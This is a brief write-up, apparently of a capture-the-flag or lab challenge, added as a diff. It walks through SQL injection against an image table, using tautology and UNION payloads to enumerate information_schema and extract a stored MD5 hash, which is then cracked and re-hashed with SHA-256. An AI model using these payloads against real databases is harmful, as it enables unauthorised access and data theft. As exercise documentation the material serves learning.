@@ -1,0 +1,26 @@
+sql-injection
+
+select * from images where id='user input'
+
+if you will input '1 or 1=1', then it will show you everything located in -images- table.
+after that you will be able to add union-query to know all allowed tables in db:
+
+```
+1 or 1=1 union select table_name, column_name FROM information_schema.columns
+```
+
+after that you will see the all tables of db.
+i found list_images and it's columns url, comment.
+now i just need to use correct query:
+
+```
+1 or 1=1 union select url, comment from list_images
+```
+
+the last output shows me hash '1928e8083cf461a51303633093573c46' hashed by MD5, i used https://crackstation.net/ to decrypt it and got 'albatroz' word, that i encrypted to sha256 by this command:
+
+python code
+```
+import hashlib
+print(hashlib.sha256(b'albatroz').hexdigest())
+```
